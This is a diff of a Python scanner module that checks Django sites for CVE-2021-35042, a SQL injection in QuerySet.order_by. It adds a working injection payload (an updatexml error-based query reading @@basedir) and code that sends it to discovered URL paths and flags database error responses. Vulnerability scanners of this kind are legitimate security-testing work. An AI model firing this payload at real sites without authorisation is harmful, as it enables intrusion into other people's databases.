@@ -1,65 +1,48 @@
 #!/usr/bin/env python3
 # -*- coding:utf-8 -*-
 
-from lib.tool.logger import logger
-from lib.tool import check
-from thirdparty import requests
+# from lib.tool import check
 
-def cve_2021_35042_scan(self, url):
+cve_2021_35042_payloads = [
+    {'path': '{URLCONF}/?order=vuln_collection.name);select updatexml(1, concat(0x7e,(select @@basedir)),1)%23'}
+    # {'path': '?order=vuln_collection.name);select updatexml(1, concat(0x7e,(select @@basedir)),1)%23'}
+]
+
+def cve_2021_35042_scan(self, clients):
     ''' 函数 QuerySet.order_by 中的 SQL 注入漏洞; 
         该漏洞需要开发者使用order_by函数, 而且可以控制查询集的输入
      '''
-    vul_info = {}
-    vul_info['app_name'] = self.app_name
-    vul_info['vul_type'] = 'SQLinject'
-    vul_info['vul_id'] = 'CVE-2021-35042'
-    vul_info['vul_method'] = 'GET'
-    vul_info['headers'] = {}
+    client = clients.get('reqClient')
+    
+    vul_info = {
+        'app_name': self.app_name,
+        'vul_type': 'SQLinject',
+        'vul_id': 'CVE-2021-35042',
+    }
+    
+    urlConfList = self.get_urlconf(client, vul_info)     # * 获取Django定义的URL路径
+    if not urlConfList:
+        return None
+    
+    for payload in cve_2021_35042_payloads:
+        for urlConf in urlConfList:
+            path = payload['path'].format(URLCONF=urlConf)
+            url = client.protocol_domain + '/'
 
-    # headers = self.headers.copy()
-    # headers.update(vul_info['headers'])
-
-    for payload in self.cve_2021_35042_payloads:
-        path = payload['path']
-        data = payload['data']
-        target = url + path
-
-        vul_info['path'] = path
-        vul_info['data'] = data
-        vul_info['target'] = target
-
-        try:
-            res = requests.get(
-                target, 
-                timeout=self.timeout, 
-                headers=self.headers,
-                data=data, 
-                proxies=self.proxies, 
-                verify=False
+            res = client.request(
+                'get',
+                url + path,
+                vul_info=vul_info
             )
-            logger.logging(vul_info, res.status_code, res)                        # * LOG
+            if res is None:
+                continue
 
-
-            # todo 判断
             if ((('OperationalError' in res.text) or ('DatabaseError' in res.text)) 
                 and ('Request information' in res.text)):
                 results = {
-                    'Target': target,
+                    'Target': res.request.url,
                     'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
-                    'Method': vul_info['vul_method'],
-                    'Payload': {
-                        'Url': url,
-                        'Path': path
-                    }
+                    'Request': res
                 }
                 return results
-
-        except requests.ConnectTimeout:
-            logger.logging(vul_info, 'Timeout')
-            return None
-        except requests.ConnectionError:
-            logger.logging(vul_info, 'Faild')
-            return None
-        except:
-            logger.logging(vul_info, 'Error')
-            return None
+    return None
